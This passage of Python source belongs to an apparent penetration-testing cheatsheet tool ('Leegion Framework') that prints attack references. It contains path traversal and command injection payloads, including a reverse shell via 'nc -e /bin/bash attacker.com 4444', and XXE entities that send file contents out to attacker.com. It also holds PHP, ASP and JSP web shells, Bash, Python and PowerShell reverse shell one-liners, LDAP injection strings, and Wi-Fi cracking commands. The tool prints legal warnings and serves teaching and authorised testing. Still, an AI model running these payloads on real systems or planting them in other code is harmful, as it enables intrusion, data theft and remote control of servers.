            ],
            "Advanced Bypass Techniques": [
                (
                    "file:///etc/passwd",
                    "File protocol for direct file system access\n"
                    + "   WHY: file:// protocol accesses local file system directly\n"
                    + "   WHEN: Application accepts URLs or URI schemes\n"
                    + "   EXAMPLE: image_viewer.php?url=file:///etc/passwd\n"
                    + "   USE CASE: URL parameter handlers, image proxies",
                ),
                (
                    "\\..\\..\\..\\etc\\passwd",
                    "Windows-style backslashes on Linux systems\n"
                    + "   WHY: Some applications convert backslashes to forward slashes\n"
                    + "   WHEN: Cross-platform applications with path normalization\n"
                    + "   EXAMPLE: include.php?page=\\..\\..\\..\\etc\\passwd\n"
                    + "   USE CASE: Applications designed for Windows but running on Linux",
                ),
                (
                    "..;/etc/passwd",
                    "Semicolon bypass for command injection filters\n"
                    + "   WHY: Semicolons can terminate commands and confuse parsers\n"
                    + "   WHEN: Application uses semicolon as path separator\n"
                    + "   EXAMPLE: view.php?file=..;/etc/passwd\n"
                    + "   USE CASE: Custom file handling with semicolon parsing",
                ),
                (
                    "../etc/passwd%00.txt",
                    "Null byte injection to bypass extension checking\n"
                    + "   WHY: %00 (null byte) terminates strings in C-based languages\n"
                    + "   WHEN: Application checks file extensions but uses vulnerable functions\n"
                    + "   EXAMPLE: download.php?file=../etc/passwd%00.pdf\n"
                    + "   USE CASE: Legacy PHP applications, older web servers",
                ),
                (
                    "..././..././..././etc/passwd",
                    "Filter bypass using redundant path components\n"
                    + "   WHY: ../ inside ../ confuses simple regex filters\n"
                    + "   WHEN: Filters remove ../ but don't handle nested patterns\n"
                    + "   EXAMPLE: Filter removes ../ leaving ../ behind\n"
                    + "   USE CASE: Applications with recursive string replacement",
                ),
            ],
        }

        print(f"\n\033[96m🎯 TYPICAL PATH TRAVERSAL ATTACK WORKFLOW:\033[0m")
        print("1. Identify file handling → Look for file parameters, downloads")
        print("2. Test basic traversal → ../../../etc/passwd")
        print("3. Try encoding bypass → URL encode, double encode")
        print("4. Platform-specific paths → Windows vs Linux paths")
        print("5. Advanced techniques → Null bytes, protocol handlers")

        self._display_cheatsheet("Path Traversal", path_info)

    def _command_injection_reference(self):
        """Command injection reference with comprehensive use cases"""
        print(f"\n\033[96m📚 WHAT IS COMMAND INJECTION?\033[0m")
        print("Command injection occurs when an application passes unsafe user input")
        print("to a system shell, allowing attackers to execute arbitrary commands")
        print("on the server with the application's privileges.")
        print(f"\n\033[93m💡 REAL-WORLD SCENARIOS WHERE YOU'D USE THESE:\033[0m")
        print("• Web applications: Ping functionality, file converters, system tools")
        print("• CTF challenges: Command injection boxes, web exploitation")
        print("• IoT devices: Network diagnostic tools, configuration interfaces")
        print("• Network appliances: Ping, traceroute, network testing features")
        print(
            f"\n\033[91m⚠️  LEGAL WARNING:\033[0m Only test on systems you own or have explicit permission to test!"
        )

        cmd_info = {
            "Basic Command Injection": [
                (
                    "; ls",
                    "Command separator - executes after first command\n"
                    + "   WHY: Semicolon separates commands in shell\n"
                    + "   WHEN: Input isn't properly validated before shell execution\n"
                    + "   EXAMPLE: ping 127.0.0.1; ls becomes two commands\n"
                    + "   USE CASE: Web ping tools, system diagnostic features",
                ),
                (
                    "| whoami",
                    "Pipe operator - processes output through second command\n"
                    + "   WHY: Pipes first command output to second\n"
                    + "   WHEN: Want to process or ignore first command output\n"
                    + "   EXAMPLE: ping 127.0.0.1 | whoami\n"
                    + "   USE CASE: Data exfiltration, bypassing output filtering",
                ),
                (
                    "&& id",
                    "AND operator - executes only if first command succeeds\n"
                    + "   WHY: Commands run sequentially if previous succeeds\n"
                    + "   WHEN: Want to ensure first command completes successfully\n"
                    + "   EXAMPLE: ping 127.0.0.1 && id\n"
                    + "   USE CASE: Conditional execution, avoiding errors in logs",
                ),
                (
                    "|| cat /etc/passwd",
                    "OR operator - executes only if first command fails\n"
                    + "   WHY: Backup command runs if first fails\n"
                    + "   WHEN: First command designed to fail\n"
                    + "   EXAMPLE: ping invalidhost || cat /etc/passwd\n"
                    + "   USE CASE: Bypassing input validation, error handling exploitation",
                ),
                (
                    "`whoami`",
                    "Command substitution - runs command and uses output\n"
                    + "   WHY: Backticks execute command and substitute result\n"
                    + "   WHEN: Want to use command output as input\n"
                    + "   EXAMPLE: ping `whoami`.attacker.com\n"
                    + "   USE CASE: Data exfiltration via DNS, blind injection",
                ),
                (
                    "$(id)",
                    "Modern command substitution syntax\n"
                    + "   WHY: Alternative to backticks, more readable\n"
                    + "   WHEN: Backticks are filtered but $() isn't\n"
                    + "   EXAMPLE: ping $(id).attacker.com\n"
                    + "   USE CASE: Bypassing backtick filters, modern shell injection",
                ),
            ],
            "Filter Bypass Techniques": [
                (
                    "cat /e*c/pass*",
                    "Wildcard usage to bypass keyword filtering\n"
                    + "   WHY: Wildcards expand to match filenames\n"
                    + "   WHEN: 'passwd' keyword is filtered\n"
                    + "   EXAMPLE: /e*c/pass* expands to /etc/passwd\n"
                    + "   USE CASE: Bypassing blacklist filters, WAF evasion",
                ),
                (
                    "cat /etc/pass'w'd",
                    "Quote breaking to bypass string detection\n"
                    + "   WHY: Quotes break up filtered strings\n"
                    + "   WHEN: 'passwd' string is detected and blocked\n"
                    + "   EXAMPLE: pass'w'd becomes passwd after shell processing\n"
                    + "   USE CASE: Evading simple string-based filters",
                ),
                (
                    "cat /etc/$(echo passwd)",
                    "Command substitution bypass for keyword filtering\n"
                    + "   WHY: Command substitution generates filtered word\n"
                    + "   WHEN: Direct use of 'passwd' is blocked\n"
                    + "   EXAMPLE: $(echo passwd) produces passwd dynamically\n"
                    + "   USE CASE: Advanced filter evasion, dynamic string generation",
                ),
                (
                    "cat /etc/p?sswd",
                    "Single character wildcard for precise matching\n"
                    + "   WHY: ? matches exactly one character\n"
                    + "   WHEN: Need precise wildcard matching\n"
                    + "   EXAMPLE: p?sswd matches passwd but not password\n"
                    + "   USE CASE: Targeted file access, precise filter bypass",
                ),
                (
                    "echo cm${u}d",
                    "Variable expansion for obfuscation\n"
                    + "   WHY: Variables can be undefined but still expand\n"
                    + "   WHEN: Want to obfuscate command names\n"
                    + "   EXAMPLE: cm${u}d becomes cmd (${u} is empty)\n"
                    + "   USE CASE: Command obfuscation, advanced evasion",
                ),
            ],
        }

        print(f"\n\033[96m🎯 TYPICAL COMMAND INJECTION WORKFLOW:\033[0m")
        print("1. Test basic injection → ; ls (see if commands execute)")
        print("2. Information gathering → ; id, ; whoami, ; uname -a")
        print("3. File system access → ; cat /etc/passwd")
        print("4. Network connectivity → ; ping attacker.com")
        print("5. Reverse shell → ; nc -e /bin/bash attacker.com 4444")

        self._display_cheatsheet("Command Injection", cmd_info)

    def _xxe_reference(self):
        """XXE (XML External Entity) reference with comprehensive use cases"""
        print(f"\n\033[96m📚 WHAT IS XXE (XML EXTERNAL ENTITY)?\033[0m")
        print("XXE vulnerabilities occur when XML parsers process external entity")
        print("references, allowing attackers to read files, perform SSRF, or execute")
        print("denial of service attacks through malicious XML input.")
        print(f"\n\033[93m💡 REAL-WORLD SCENARIOS WHERE YOU'D FIND XXE:\033[0m")
        print("• SOAP web services: API endpoints accepting XML requests")
        print("• File upload features: Document processors, XML file imports")
        print("• Configuration parsers: Application settings, user preferences")
        print("• RSS/XML feeds: News aggregators, feed processors")
        print("• Office document uploads: Word, Excel files containing XML")
        print("• Mobile app backends: APIs accepting XML from mobile apps")
        print(
            f"\n\033[91m⚠️  LEGAL WARNING:\033[0m Only test applications you own or have permission to test!"
        )

        xxe_info = {
            "Basic XXE Attacks": [
                (
                    '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
                    "Direct file disclosure through external entity\n"
                    + "   WHY: SYSTEM keyword tells parser to load external resource\n"
                    + "   WHEN: XML parser processes external entities\n"
                    + "   EXAMPLE: &xxe; in XML content displays /etc/passwd\n"
                    + "   USE CASE: SOAP APIs, XML upload features, RSS processors",
                ),
                (
                    '<!ENTITY xxe SYSTEM "http://attacker.com/">',
                    "Server-Side Request Forgery (SSRF) via HTTP request\n"
                    + "   WHY: Parser makes HTTP request to external URL\n"
                    + "   WHEN: Internal services accessible from web server\n"
                    + "   EXAMPLE: Access internal APIs, cloud metadata endpoints\n"
                    + "   USE CASE: Internal network scanning, cloud service exploitation",
                ),
                (
                    '<!ENTITY % xxe SYSTEM "file:///etc/passwd">',
                    "Parameter entity for more complex payload construction\n"
                    + "   WHY: Parameter entities (%) allow building complex payloads\n"
                    + "   WHEN: Regular entities are filtered but parameter entities work\n"
                    + "   EXAMPLE: %xxe; loads file content for further processing\n"
                    + "   USE CASE: Bypassing entity filtering, building complex attacks",
                ),
                (
                    '<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">',
                    "Base64 encoding for binary files and special characters\n"
                    + "   WHY: Base64 encoding handles files with special XML characters\n"
                    + "   WHEN: Target file contains XML-breaking characters\n"
                    + "   EXAMPLE: Read binary files, source code with < > characters\n"
                    + "   USE CASE: PHP applications, reading source code files",
                ),
            ],
            "Blind XXE (No Direct Output)": [
                (
                    '<!ENTITY % file SYSTEM "file:///etc/passwd">',
                    "Out-of-band data exfiltration when no output shown\n"
                    + "   WHY: Loads file content into parameter entity for exfiltration\n"
                    + "   WHEN: XXE works but file content isn't displayed\n"
                    + "   EXAMPLE: Combined with HTTP requests to steal data\n"
                    + "   USE CASE: APIs that process XML but don't return content",
                ),
                (
                    "<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>\">",
                    "HTTP data exfiltration using dynamic entity creation\n"
                    + "   WHY: Dynamically creates entity that sends file to attacker\n"
                    + "   WHEN: Blind XXE with network connectivity\n"
                    + "   EXAMPLE: File content sent as HTTP GET parameter\n"
                    + "   USE CASE: Stealing sensitive data from blind XXE",
                ),
                (
                    '<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">',
                    "External DTD for complex blind XXE exploitation\n"
                    + "   WHY: External DTD contains malicious entity definitions\n"
                    + "   WHEN: Complex payload needed for blind exploitation\n"
                    + "   EXAMPLE: DTD file on attacker server with data theft logic\n"
                    + "   USE CASE: Advanced blind XXE with custom payload logic",
                ),
            ],
            "Advanced XXE Techniques": [
                (
                    '<!ENTITY xxe SYSTEM "expect://id">',
                    "Command execution using expect wrapper (PHP)\n"
                    + "   WHY: expect:// wrapper executes system commands\n"
                    + "   WHEN: PHP with expect extension enabled\n"
                    + "   EXAMPLE: expect://whoami returns current user\n"
                    + "   USE CASE: PHP applications with loose wrapper restrictions",
                ),
                (
                    '<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">',
                    "Data URI scheme for injecting custom content\n"
                    + "   WHY: data:// scheme allows embedding arbitrary data\n"
                    + "   WHEN: Testing for data URI support in XML parser\n"
                    + "   EXAMPLE: Base64 encoded 'Hello World' message\n"
                    + "   USE CASE: Testing parser capabilities, content injection",
                ),
            ],
        }

        print(f"\n\033[96m🎯 TYPICAL XXE ATTACK WORKFLOW:\033[0m")
        print("1. Identify XML input → APIs, file uploads, configuration")
        print('2. Test basic XXE → <!ENTITY xxe SYSTEM "file:///etc/passwd">')
        print("3. Check for blind XXE → Use HTTP callbacks if no output")
        print("4. Exploit SSRF → Access internal services via HTTP entities")
        print("5. Exfiltrate data → Use out-of-band techniques for sensitive files")

        self._display_cheatsheet("XXE (XML External Entity)", xxe_info)

    def _insecure_deserialization_reference(self):
        """Insecure deserialization reference"""
        deser_info = {
            "PHP Serialization": [
                ('O:4:"User":1:{s:2:"id";i:1;}', "PHP object serialization"),
                ("unserialize($_POST['data'])", "Vulnerable PHP code"),
                ("__wakeup(), __destruct()", "Magic methods for exploitation"),
            ],
            "Java Serialization": [
                ("ysoserial CommonsCollections1 'calc'", "Generate Java payload"),
                ("ObjectInputStream.readObject()", "Vulnerable Java method"),
                ("java.io.Serializable", "Serializable interface"),
            ],
            "Python Pickle": [
                ("pickle.loads(data)", "Vulnerable Python code"),
                ("__reduce__ method", "Exploitation method"),
                ("cPickle module", "C implementation"),
            ],
        }
        self._display_cheatsheet("Insecure Deserialization", deser_info)

    def _generate_command_injection_payloads(self):
        """Generate command injection payloads"""
        self.print_info(
            "Command injection payloads reference displayed above in vulnerability references"
        )

    def _generate_path_traversal_payloads(self):
        """Generate path traversal payloads"""
        self.print_info(
            "Path traversal payloads reference displayed above in vulnerability references"
        )

    def _generate_ldap_payloads(self):
        """Generate LDAP injection payloads"""
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*)(|(cn=*))",
        ]
        print(f"\n\033[93m{'LDAP Injection Payloads'.center(50)}\033[0m")
        print(f"\033[93m{'-'*50}\033[0m")
        for payload in ldap_payloads:
            print(f"\033[96m{payload}\033[0m")

    def _generate_xxe_payloads(self):
        """Generate XXE payloads"""
        self.print_info(
            "XXE payloads reference displayed above in vulnerability references"
        )

    def _port_numbers_reference(self):
        """Common port numbers reference"""
        ports_info = {
            "Common TCP Ports": [
                ("21", "FTP"),
                ("22", "SSH"),
                ("23", "Telnet"),
                ("25", "SMTP"),
                ("53", "DNS"),
                ("80", "HTTP"),
                ("110", "POP3"),
                ("143", "IMAP"),
                ("443", "HTTPS"),
                ("993", "IMAPS"),
                ("995", "POP3S"),
            ],
            "Database Ports": [
                ("1433", "MS SQL Server"),
                ("1521", "Oracle"),
                ("3306", "MySQL"),
                ("5432", "PostgreSQL"),
                ("6379", "Redis"),
                ("27017", "MongoDB"),
            ],
            "Security Services": [
                ("88", "Kerberos"),
                ("389", "LDAP"),
                ("636", "LDAPS"),
                ("1812", "RADIUS"),
                ("1813", "RADIUS Accounting"),
            ],
        }
        self._display_cheatsheet("Common Port Numbers", ports_info)

    def _network_recon_reference(self):
        """Network reconnaissance reference"""
        recon_info = {
            "Network Discovery": [
                ("nmap -sn 192.168.1.0/24", "Ping sweep"),
                ("masscan -p1-65535 192.168.1.0/24", "Fast port scanning"),
                ("arp-scan -l", "ARP discovery"),
                ("netdiscover -r 192.168.1.0/24", "Passive discovery"),
            ],
            "Service Enumeration": [
                ("nmap -sV -p- target", "Version detection"),
                ("nmap -sC target", "Default scripts"),
                ("enum4linux target", "SMB enumeration"),
                ("showmount -e target", "NFS shares"),
            ],
        }
        self._display_cheatsheet("Network Reconnaissance", recon_info)

    def _wireless_security_reference(self):
        """Wireless security reference"""
        wireless_info = {
            "WiFi Reconnaissance": [
                ("airodump-ng wlan0mon", "Monitor wireless networks"),
                ("wash -i wlan0mon", "WPS scan"),
                ("reaver -i wlan0mon -b MAC -vv", "WPS attack"),
                ("aircrack-ng -w wordlist.txt capture.cap", "WPA/WPA2 cracking"),
            ]
        }
        self._display_cheatsheet("Wireless Security", wireless_info)

    def _network_protocols_reference(self):
        """Network protocols reference"""
        protocols_info = {
            "Common Protocols": [
                ("TCP", "Transmission Control Protocol"),
                ("UDP", "User Datagram Protocol"),
                ("ICMP", "Internet Control Message Protocol"),
                ("ARP", "Address Resolution Protocol"),
                ("DHCP", "Dynamic Host Configuration Protocol"),
            ]
        }
        self._display_cheatsheet("Network Protocols", protocols_info)

    def _firewall_evasion_reference(self):
        """Firewall evasion reference"""
        evasion_info = {
            "Nmap Evasion": [
                ("nmap -f target", "Fragment packets"),
                ("nmap -D RND:10 target", "Decoy scanning"),
                ("nmap -sA target", "ACK scan"),
                ("nmap --source-port 53 target", "Source port manipulation"),
            ]
        }
        self._display_cheatsheet("Firewall Evasion", evasion_info)

    def _http_status_codes_reference(self):
        """HTTP status codes reference"""
        status_info = {
            "Success (2xx)": [
                ("200", "OK - Request successful"),
                ("201", "Created - Resource created"),
                ("204", "No Content - Successful but no content"),
                ("206", "Partial Content - Range request"),
            ],
            "Redirection (3xx)": [
                ("301", "Moved Permanently"),
                ("302", "Found (Temporary redirect)"),
                ("304", "Not Modified"),
                ("307", "Temporary Redirect"),
            ],
            "Client Error (4xx)": [
                ("400", "Bad Request"),
                ("401", "Unauthorized"),
                ("403", "Forbidden"),
                ("404", "Not Found"),
                ("405", "Method Not Allowed"),
                ("429", "Too Many Requests"),
            ],
            "Server Error (5xx)": [
                ("500", "Internal Server Error"),
                ("501", "Not Implemented"),
                ("502", "Bad Gateway"),
                ("503", "Service Unavailable"),
                ("504", "Gateway Timeout"),
            ],
        }
        self._display_cheatsheet("HTTP Status Codes", status_info)

    def _http_headers_reference(self):
        """HTTP headers reference"""
        headers_info = {
            "Security Headers": [
                ("X-Frame-Options: DENY", "Clickjacking protection"),
                ("X-XSS-Protection: 1; mode=block", "XSS filtering"),
                ("X-Content-Type-Options: nosniff", "MIME type sniffing protection"),
                ("Strict-Transport-Security: max-age=31536000", "HTTPS enforcement"),
                ("Content-Security-Policy: default-src 'self'", "Content restrictions"),
            ],
            "Common Headers": [
                ("User-Agent: Mozilla/5.0...", "Browser identification"),
                ("Authorization: Bearer token", "Authentication"),
                ("Content-Type: application/json", "Content type"),
                ("Accept: text/html,application/xhtml+xml", "Accepted content types"),
                ("Referer: https://example.com/", "Referring page"),
            ],
        }
        self._display_cheatsheet("HTTP Headers", headers_info)

    def _web_shells_reference(self):
        """Web shells reference"""
        shells_info = {
            "PHP Web Shells": [
                ("<?php system($_GET['cmd']); ?>", "Simple PHP shell"),
                ("<?php eval($_POST['cmd']); ?>", "PHP eval shell"),
                ("<?php passthru($_GET['cmd']); ?>", "PHP passthru shell"),
            ],
            "ASP Web Shells": [
                ('<%eval request("cmd")%>', "Simple ASP shell"),
                (
                    '<%=CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.Readall()%>',
                    "ASP command execution",
                ),
            ],
            "JSP Web Shells": [
                (
                    '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
                    "JSP command execution",
                )
            ],
        }
        self._display_cheatsheet("Web Shells", shells_info)

    def _reverse_shells_reference(self):
        """Reverse shells reference"""
        shells_info = {
            "Bash Reverse Shells": [
                ("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1", "Bash TCP reverse shell"),
                (
                    "0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196",
                    "Bash alternative",
                ),
                ("/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1", "Bash with TTY"),
            ],
            "Python Reverse Shells": [
                (
                    'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
                    "Python reverse shell",
                ),
                (
                    'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'',
                    "Python3 with PTY",
                ),
            ],
            "PowerShell Reverse Shells": [
                (
                    'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);',
                    "PowerShell TCP client",
                )
            ],
        }
        self._display_cheatsheet("Reverse Shells", shells_info)

    def _web_fuzzing_reference(self):
        """Web fuzzing reference"""
        fuzzing_info = {
            "Directory Fuzzing": [
                ("ffuf -w /path/to/wordlist -u http://target/FUZZ", "Fast web fuzzer"),
                (
                    "gobuster dir -u http://target -w /path/to/wordlist",
                    "Directory brute forcing",
                ),
                (
                    "wfuzz -c -z file,/path/to/wordlist --hc 404 http://target/FUZZ",
                    "Web application fuzzer",
                ),
                ("dirb http://target /path/to/wordlist", "Web content scanner"),
            ],
            "Parameter Fuzzing": [
                (
                    "ffuf -w /path/to/wordlist -u http://target/page?FUZZ=value",
                    "GET parameter fuzzing",
                ),
                (
                    "ffuf -w /path/to/wordlist -X POST -d 'FUZZ=value' -u http://target/page",
                    "POST parameter fuzzing",
                ),
                (
                    "wfuzz -c -z file,/path/to/wordlist -d 'FUZZ=value' http://target/page",
                    "Parameter discovery",
                ),
            ],
            "Subdomain Fuzzing": [
                (
                    "ffuf -w /path/to/subdomains.txt -u http://FUZZ.target.com",
                    "Subdomain enumeration",
                ),
                (
                    "gobuster dns -d target.com -w /path/to/subdomains.txt",
                    "DNS subdomain brute force",
                ),
                (
                    "wfuzz -c -w /path/to/subdomains.txt -H 'Host: FUZZ.target.com' http://target.com",
                    "Virtual host discovery",
                ),
            ],
        }
        self._display_cheatsheet("Web Fuzzing", fuzzing_info)

    def _linux_commands_card(self):
        """Linux commands reference card"""
        commands_info = {
            "File Operations": [
                ("ls -la", "List files with details"),
                ("find / -name filename", "Find file by name"),
                ("grep -r 'pattern' .", "Search text in files"),
                ("chmod 755 file", "Change file permissions"),
                ("chown user:group file", "Change ownership"),
            ],
            "Network": [
                ("netstat -tulpn", "Show listening ports"),
                ("ss -tulpn", "Modern netstat alternative"),
                ("iptables -L", "List firewall rules"),
                ("tcpdump -i eth0", "Capture network traffic"),
            ],
            "Process Management": [
                ("ps aux", "List all processes"),
                ("kill -9 PID", "Force kill process"),
                ("nohup command &", "Run in background"),
                ("jobs", "List background jobs"),
            ],
        }
        self._display_cheatsheet("Linux Commands", commands_info)

    def _windows_commands_card(self):
        """Windows commands reference card"""
        commands_info = {
            "File Operations": [
                ("dir /a", "List all files including hidden"),
                ('forfiles /m *.* /c "cmd /c echo @path"', "Find files"),
                ('findstr /s /i "text" *.*', "Search text in files"),
                ("icacls file", "View file permissions"),
                ("attrib +h file", "Hide file"),
            ],
            "Network": [
                ("netstat -an", "Show network connections"),
                ("ipconfig /all", "Show IP configuration"),
                ("arp -a", "Show ARP table"),
                ("route print", "Show routing table"),
            ],
            "System Info": [
                ("systeminfo", "System information"),
                ("tasklist", "List running processes"),
                ("wmic process list full", "Detailed process list"),
                ("net user", "List users"),
            ],
        }
        self._display_cheatsheet("Windows Commands", commands_info)

    def _powershell_commands_card(self):
        """PowerShell commands reference card"""
        commands_info = {
            "File Operations": [
                ("Get-ChildItem -Force", "List all files"),
                ("Get-Content file.txt", "Read file content"),
                ("Select-String -Pattern 'text' -Path *", "Search text in files"),
                ("Get-Acl file.txt", "Get file permissions"),
                (
                    "Set-ItemProperty file.txt -Name Attributes -Value Hidden",
                    "Hide file",
                ),
            ],
            "Network": [
                ("Get-NetTCPConnection", "Show TCP connections"),
                ("Test-NetConnection -ComputerName host -Port 80", "Test connectivity"),
                ("Get-NetAdapter", "List network adapters"),
                ("Resolve-DnsName domain.com", "DNS lookup"),
            ],
            "System Info": [
                ("Get-ComputerInfo", "System information"),
                ("Get-Process", "List processes"),
                ("Get-Service", "List services"),
                ("Get-LocalUser", "List local users"),
            ],
        }
        self._display_cheatsheet("PowerShell Commands", commands_info)

    def _bash_scripting_card(self):
        """Bash scripting reference card"""
        scripting_info = {
            "Variables & Conditionals": [
                ("if [ $# -eq 0 ]; then echo 'No args'; fi", "Check argument count"),
                ("for i in {1..10}; do echo $i; done", "For loop"),
                ("while read line; do echo $line; done < file", "While loop"),
                ("VAR=${1:-default}", "Variable with default"),
            ],
            "File Tests": [
                ("[ -f file ]", "Test if file exists"),
                ("[ -d dir ]", "Test if directory exists"),
                ("[ -x file ]", "Test if executable"),
                ("[ -s file ]", "Test if file not empty"),
            ],
            "String Operations": [
                ("${#string}", "String length"),
                ("${string:0:5}", "Substring"),
                ("${string/old/new}", "Replace first occurrence"),
                ("${string//old/new}", "Replace all occurrences"),
            ],
        }
        self._display_cheatsheet("Bash Scripting", scripting_info)

    def _regex_reference_card(self):
        """Regular expressions reference card"""
        regex_info = {
            "Basic Patterns": [
                (".", "Any character"),
                ("^", "Start of line"),
                ("$", "End of line"),
                ("*", "Zero or more"),
                ("+", "One or more"),
                ("?", "Zero or one"),
            ],
            "Character Classes": [
                ("[abc]", "Any of a, b, or c"),
                ("[^abc]", "Not a, b, or c"),
                ("[a-z]", "Any lowercase letter"),
                ("\\d", "Any digit"),
                ("\\w", "Any word character"),
                ("\\s", "Any whitespace"),
            ],
            "Common Patterns": [
                ("\\b\\w+@\\w+\\.\\w+\\b", "Email address"),
                ("\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b", "IP address"),
                ("\\b\\d{4}-\\d{2}-\\d{2}\\b", "Date (YYYY-MM-DD)"),
                ("\\b[A-Za-z0-9]{8,}\\b", "Strong password pattern"),
            ],
        }
        self._display_cheatsheet("Regular Expressions", regex_info)

    def _export_all_cheatsheets_json(self, output_dir: str, timestamp: str):
        """Export all cheatsheets to JSON"""
        import os

        os.makedirs(output_dir, exist_ok=True)

        filename = f"cheatsheets_{timestamp}.json"
        filepath = os.path.join(output_dir, filename)

        export_data = {
            "export_timestamp": datetime.now().isoformat(),
            "custom_commands": self.custom_commands,
            "favorites": list(self.favorites),
            "command_history": self.command_history,
        }

        with open(filepath, "w") as f:
            json.dump(export_data, f, indent=2)

        self.print_success(f"Cheatsheets exported to: {filepath}")

    def _export_custom_commands(self, output_dir: str, timestamp: str):
        """Export custom commands"""
        import os

        os.makedirs(output_dir, exist_ok=True)

        filename = f"custom_commands_{timestamp}.json"
        filepath = os.path.join(output_dir, filename)

        with open(filepath, "w") as f:
            json.dump(self.custom_commands, f, indent=2)

        self.print_success(f"Custom commands exported to: {filepath}")

    def _export_favorites(self, output_dir: str, timestamp: str):
        """Export favorite commands"""
        import os

        os.makedirs(output_dir, exist_ok=True)

        filename = f"favorites_{timestamp}.txt"
        filepath = os.path.join(output_dir, filename)

        with open(filepath, "w") as f:
            for favorite in sorted(self.favorites):
                f.write(f"{favorite}\n")

        self.print_success(f"Favorites exported to: {filepath}")

    def _create_pdf_cheatsheet(self, output_dir: str, timestamp: str):
        """Create PDF cheatsheet with real functionality"""
        try:
            # Try to use wkhtmltopdf for PDF generation
            import subprocess

            result = subprocess.run(
                ["wkhtmltopdf", "--version"], capture_output=True, text=True
            )
            if result.returncode == 0:
                # Generate HTML content first
                html_content = self._generate_comprehensive_cheatsheet_html()

                # Create temporary HTML file
                html_filename = f"temp_cheatsheet_{timestamp}.html"
                html_filepath = os.path.join(output_dir, html_filename)

                with open(html_filepath, "w") as f:
                    f.write(html_content)

                # Convert to PDF
                pdf_filename = f"cheatsheet_{timestamp}.pdf"
                pdf_filepath = os.path.join(output_dir, pdf_filename)

                subprocess.run(["wkhtmltopdf", html_filepath, pdf_filepath], check=True)

                # Clean up temporary HTML file
                os.remove(html_filepath)

                self.print_success(f"PDF cheatsheet created: {pdf_filepath}")
            else:
                raise FileNotFoundError("wkhtmltopdf not available")

        except (FileNotFoundError, subprocess.CalledProcessError):
            # Fallback: create detailed HTML version
            self.print_warning(
                "wkhtmltopdf not available. Creating detailed HTML version..."
            )
            html_content = self._generate_comprehensive_cheatsheet_html()

            html_filename = f"comprehensive_cheatsheet_{timestamp}.html"
            html_filepath = os.path.join(output_dir, html_filename)

            with open(html_filepath, "w") as f:
                f.write(html_content)

            self.print_success(f"HTML cheatsheet created: {html_filepath}")
            self.print_info(
                "Install wkhtmltopdf for PDF generation: sudo apt-get install wkhtmltopdf"
            )
            self.print_info("Or convert manually using browser print function")

    def _generate_comprehensive_cheatsheet_html(self) -> str:
        """Generate comprehensive HTML cheatsheet"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Leegion Framework - Comprehensive Cheatsheet</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; }
                h1 { color: #2c3e50; text-align: center; border-bottom: 3px solid #3498db; }
                h2 { color: #34495e; border-bottom: 2px solid #3498db; margin-top: 30px; }
                h3 { color: #2980b9; }
                .command-block { background: #f8f9fa; padding: 15px; margin: 10px 0; border-left: 4px solid #3498db; }
                .command { font-family: 'Courier New', monospace; color: #e74c3c; font-weight: bold; }
                .description { color: #7f8c8d; margin-top: 5px; }
                .category { background: #ecf0f1; padding: 20px; margin: 20px 0; border-radius: 5px; }
                .favorites { background: #d5f4e6; padding: 15px; border-radius: 5px; }
            </style>
        </head>
        <body>
            <h1>Leegion Framework - Comprehensive Security Cheatsheet</h1>

            <h2>Network Reconnaissance</h2>
            <div class="category">
                <h3>Nmap Scanning</h3>
                <div class="command-block">
                    <div class="command">nmap -sS &lt;target&gt;</div>
                    <div class="description">SYN stealth scan - fast and unobtrusive</div>
                </div>
                <div class="command-block">
                    <div class="command">nmap -sV -O &lt;target&gt;</div>
                    <div class="description">Service version and OS detection</div>
                </div>
                <div class="command-block">
                    <div class="command">nmap --script vuln &lt;target&gt;</div>
                    <div class="description">Vulnerability scanning with NSE scripts</div>
                </div>
            </div>

            <h2>Web Application Security</h2>
            <div class="category">
                <h3>Directory Bruteforcing</h3>
                <div class="command-block">
                    <div class="command">gobuster dir -u &lt;url&gt; -w &lt;wordlist&gt;</div>
                    <div class="description">Fast directory and file brute force</div>
                </div>
                <div class="command-block">
                    <div class="command">ffuf -w &lt;wordlist&gt; -u &lt;url&gt;/FUZZ</div>
                    <div class="description">Web fuzzer written in Go</div>
                </div>

                <h3>SQL Injection</h3>
                <div class="command-block">
                    <div class="command">sqlmap -u &lt;url&gt; --dbs</div>
                    <div class="description">Automated SQL injection and database takeover</div>
                </div>
            </div>

            <h2>Subdomain Enumeration</h2>
            <div class="category">
                <div class="command-block">
                    <div class="command">subfinder -d &lt;domain&gt;</div>
                    <div class="description">Fast passive subdomain enumeration</div>
                </div>
                <div class="command-block">
                    <div class="command">amass enum -d &lt;domain&gt;</div>
                    <div class="description">In-depth attack surface mapping</div>
                </div>
            </div>

            <h2>SSL/TLS Analysis</h2>
            <div class="category">
                <div class="command-block">
                    <div class="command">testssl.sh &lt;target&gt;</div>
                    <div class="description">Comprehensive SSL/TLS tester</div>
                </div>
                <div class="command-block">
                    <div class="command">sslscan &lt;target&gt;</div>
                    <div class="description">SSL configuration scanner</div>
